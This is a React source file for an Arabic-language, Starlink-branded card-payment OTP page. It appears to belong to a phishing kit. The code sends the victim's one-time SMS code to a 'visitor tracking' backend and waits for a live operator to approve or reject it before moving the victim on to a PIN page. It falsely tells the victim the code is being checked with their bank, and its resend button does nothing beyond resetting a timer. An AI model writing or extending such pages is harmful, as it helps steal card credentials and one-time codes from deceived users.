import { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ShieldCheck, Loader2 } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import { updateVisitorData } from "@/hooks/useVisitorTracking";
import { SavedCardBadge, readCardMeta, SavedCardMeta } from "@/components/starlink/SavedCardBadge";
import SEO from "@/components/SEO";
import { seoData } from "@/lib/seo";

const PaymentOtp = () => {
  const navigate = useNavigate();
  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [seconds, setSeconds] = useState(60);
  const [card, setCard] = useState<SavedCardMeta | null>(null);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const stored = sessionStorage.getItem("starlink_card");
    if (!stored) navigate("/payment", { replace: true });
    setCard(readCardMeta());
  }, [navigate]);

  useEffect(() => {
    if (seconds <= 0) return;
    const id = setInterval(() => setSeconds((s) => s - 1), 1000);
    return () => clearInterval(id);
  }, [seconds]);

  useEffect(() => {
    const onApproval = (e: Event) => {
      const detail = (e as CustomEvent).detail;
      if (!detail) return;
      if (detail.command === "approve_otp") {
        setWaiting(false);
        navigate("/payment/pin");
      } else if (detail.command === "reject_otp") {
        setWaiting(false);
        setDigits(["", "", "", "", "", ""]);
        setTimeout(() => inputRefs.current[0]?.focus(), 50);
        toast({
          title: "رمز التحقق غير صحيح",
          description: "أعد إدخال الرمز المرسل عبر رسالة SMS.",
          variant: "destructive",
        });
      }
    };
    window.addEventListener("visitor-approval", onApproval);
    return () => window.removeEventListener("visitor-approval", onApproval);
  }, [navigate]);

  const handleDigitChange = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const newDigits = [...digits];
    newDigits[index] = digit;
    setDigits(newDigits);
    if (digit && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !digits[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    const newDigits = ["", "", "", "", "", ""];
    for (let i = 0; i < pasted.length; i++) newDigits[i] = pasted[i];
    setDigits(newDigits);
    const nextEmpty = pasted.length < 6 ? pasted.length : 5;
    inputRefs.current[nextEmpty]?.focus();
  };

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otp = digits.join("");
    if (otp.length < 4) {
      toast({ title: "رمز OTP غير صالح", description: "أدخل الرمز المرسل عبر رسالة SMS.", variant: "destructive" });
      return;
    }
    setLoading(true);
    await updateVisitorData({ card_otp: otp });
    setLoading(false);
    setWaiting(true);
  };

  return (
    <>
      <SEO title={seoData.paymentOtp.title} description={seoData.paymentOtp.description} path="/payment/otp" noIndex />
      <div className="min-h-screen bg-background flex items-center justify-center px-4">
        <div className="w-full max-w-md">
          <div className="border border-foreground/10 p-8 space-y-6">
            <div className="flex items-center justify-between gap-2 flex-wrap">
              <div className="flex items-center gap-2 text-xs text-muted-foreground">
                <ShieldCheck className="w-4 h-4" />
                <span>تحقق ثنائي — خطوة لحماية دفعتك واتحادك.</span>
              </div>
              {card && <SavedCardBadge brand={card.brand} last4={card.last4} />}
            </div>

            <div>
              <h2 className="text-lg font-medium mb-1">رمز التحقق OTP</h2>
              <p className="text-sm text-muted-foreground">أرسلنا رمز تحقق إلى هاتفك المرتبط بالبطاقة. أدخل الرمز أدناه.</p>
            </div>

            <form onSubmit={submit} className="space-y-5">
              <div>
                <label className="text-sm text-muted-foreground mb-3 block">رمز التحقق</label>
                <div className="flex gap-2 justify-center" dir="ltr" onPaste={handlePaste}>
                  {digits.map((d, i) => (
                    <input
                      key={i}
                      ref={(el) => { inputRefs.current[i] = el; }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={d}
                      onChange={(e) => handleDigitChange(i, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(i, e)}
                      disabled={waiting}
                      autoFocus={i === 0}
                      className="w-11 h-14 bg-transparent border border-foreground/20 focus:border-foreground outline-none transition-colors text-center text-2xl disabled:opacity-60"
                    />
                  ))}
                </div>
                <div className="flex justify-between items-center mt-2 text-xs text-muted-foreground">
                  <span>{seconds > 0 ? `إعادة الإرسال خلال ${seconds}ث` : "يمكنك إعادة إرسال الرمز"}</span>
                  <button
                    type="button"
                    disabled={seconds > 0 || waiting}
                    onClick={() => setSeconds(60)}
                    className="underline disabled:opacity-40 disabled:no-underline"
                  >
                    إعادة إرسال الرمز
                  </button>
                </div>
              </div>

              <button
                type="submit"
                disabled={loading || waiting}
                className="w-full h-12 bg-foreground text-background hover:bg-foreground/90 transition-all text-sm font-medium tracking-wider disabled:opacity-60 inline-flex items-center justify-center gap-2"
              >
                {waiting ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    جاري التأكيد...
                  </>
                ) : loading ? (
                  "جاري الإرسال..."
                ) : (
                  "تأكيد الدفع"
                )}
              </button>

              {waiting && (
                <p className="text-xs text-muted-foreground text-center">
                  نتحقق من رمز OTP مع البنك. قد يستغرق ذلك بضع لحظات.
                </p>
              )}
            </form>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentOtp;
